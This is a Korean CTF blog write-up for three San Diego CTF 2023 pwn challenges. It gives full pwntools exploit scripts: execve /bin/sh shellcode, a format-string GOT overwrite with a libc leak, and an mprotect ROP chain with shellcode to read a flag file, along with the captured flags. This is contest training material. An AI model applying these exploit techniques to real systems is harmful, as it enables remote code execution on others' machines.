@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1910  1주일 뒤에나 작성하는 Write ups.. 한 문제 빼고 다 풀었는데 못 푼 문제는 너무 극악의 fsb였다. 나머지 문제는 쉽게 풀이했던 걸로 기억.  Turtle Shell A turtle without it’s shell is a sad sight to seeConnect via: nc tur">
+<meta property="og:type" content="article">
+<meta property="og:title" content="San Diego CTF 2023 Write ups">
+<meta property="og:url" content="https://jiravvit.github.io/230515-sandiegoctf2023-PWN/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1910  1주일 뒤에나 작성하는 Write ups.. 한 문제 빼고 다 풀었는데 못 푼 문제는 너무 극악의 fsb였다. 나머지 문제는 쉽게 풀이했던 걸로 기억.  Turtle Shell A turtle without it’s shell is a sad sight to seeConnect via: nc tur">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-14T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-15T11:38:07.879Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="fsb">
+<meta property="article:tag" content="seccomp">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>San Diego CTF 2023 Write ups</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230509-wanictf2023-8.time-table/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&text=San Diego CTF 2023 Write ups"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&is_video=false&description=San Diego CTF 2023 Write ups"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=San Diego CTF 2023 Write ups&body=Check out this article: https://jiravvit.github.io/230515-sandiegoctf2023-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&name=San Diego CTF 2023 Write ups&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&t=San Diego CTF 2023 Write ups"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Turtle-Shell"><span class="toc-number">1.</span> <span class="toc-text">Turtle Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">1.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#money-printer"><span class="toc-number">2.</span> <span class="toc-text">money-printer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tROPic-thunder"><span class="toc-number">3.</span> <span class="toc-text">tROPic-thunder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-2"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        San Diego CTF 2023 Write ups
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-14T22:00:00.000Z" itemprop="datePublished">2023-05-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/San-Diego/">San Diego</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/fsb/" rel="tag">fsb</a>, <a class="tag-link-link" href="/tags/seccomp/" rel="tag">seccomp</a>, <a class="tag-link-link" href="/tags/shellcode/" rel="tag">shellcode</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1910">https://ctftime.org/event/1910</a></li>
+</ul>
+<p>1주일 뒤에나 작성하는 Write ups.. 한 문제 빼고 다 풀었는데 못 푼 문제는 너무 극악의 fsb였다. 나머지 문제는 쉽게 풀이했던 걸로 기억. </p>
+<h2 id="Turtle-Shell"><a href="#Turtle-Shell" class="headerlink" title="Turtle Shell"></a>Turtle Shell</h2><blockquote>
+<p>A turtle without it’s shell is a sad sight to see<br>Connect via: <code>nc turtle.sdc.tf 1337</code><br>Dockerfile turtle-shell</p>
+</blockquote>
+<ul>
+<li>[111 solves &#x2F; 100 points]</li>
+</ul>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./turtle-shell&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;turtle.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./turtle-shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="money-printer"><a href="#money-printer" class="headerlink" title="money-printer"></a>money-printer</h2><blockquote>
+<p>The first step to getting rich is printing money<br>Connect via: <code>nc money.sdc.tf 1337</code><br>Dockerfile money-printer</p>
+</blockquote>
+<ul>
+<li>[140 solves &#x2F; 150 points]</li>
+</ul>
+<h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./money-printerp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;money.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./money-printerp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. exit@got -&gt; main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;exit&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>] &#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#51</span></span><br><span class="line"><span class="comment"># - 0x21c87</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%57$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x21c87</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">4</span>] &#125;,</span><br><span class="line">        write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"><span class="comment"># sdctf&#123;d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary                        : ✓ (value: 0xedabb8ef1d292700)</span></span><br><span class="line"><span class="comment"># NX                            : ✓</span></span><br><span class="line"><span class="comment"># PIE                           : ✘</span></span><br><span class="line"><span class="comment"># Fortify                       : ✘</span></span><br><span class="line"><span class="comment"># RelRO                         : Partial</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="tROPic-thunder"><a href="#tROPic-thunder" class="headerlink" title="tROPic-thunder"></a>tROPic-thunder</h2><blockquote>
+<p>I hope this isn’t your first rodeo<br>Connect via: <code>nc thunder.sdc.tf 1337</code><br>Dockerfile tROPic-thunder</p>
+</blockquote>
+<ul>
+<li>[69 solves &#x2F; 250 points]</li>
+</ul>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>seccomp이 걸려있지만 평이하게 걸려있다. <code>execve</code>를 실행시키자.</p>
+<p><code>mprotect</code>가 있는 한, 이것을 실행시켜 특정 공간에 실행 권한을 주고 거기에 쉘 코드를 넣어서 그 곳으로 점프하는 생각을 하자.</p>
+<h3 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./tROPic-thunder&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;thunder.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tROPic-thunder&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x41003c</span></span><br><span class="line">pop_rax = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a6</span></span><br><span class="line">pop_rsi = <span class="number">0x40165c</span></span><br><span class="line">pop_rdx = <span class="number">0x4589f5</span></span><br><span class="line"></span><br><span class="line">bss = e.bss() + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># mprotect(bss, 0x1000, 7)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rax)</span></span><br><span class="line"><span class="comment"># payload += p64(10)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"><span class="comment"># read(0, bss, 0x1000)</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x41414141) # jmp!</span></span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>) <span class="comment"># jmp!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, read, write</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Turtle-Shell"><span class="toc-number">1.</span> <span class="toc-text">Turtle Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">1.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#money-printer"><span class="toc-number">2.</span> <span class="toc-text">money-printer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tROPic-thunder"><span class="toc-number">3.</span> <span class="toc-text">tROPic-thunder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-2"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&text=San Diego CTF 2023 Write ups"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&is_video=false&description=San Diego CTF 2023 Write ups"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=San Diego CTF 2023 Write ups&body=Check out this article: https://jiravvit.github.io/230515-sandiegoctf2023-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&title=San Diego CTF 2023 Write ups"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&name=San Diego CTF 2023 Write ups&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230515-sandiegoctf2023-PWN/&t=San Diego CTF 2023 Write ups"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
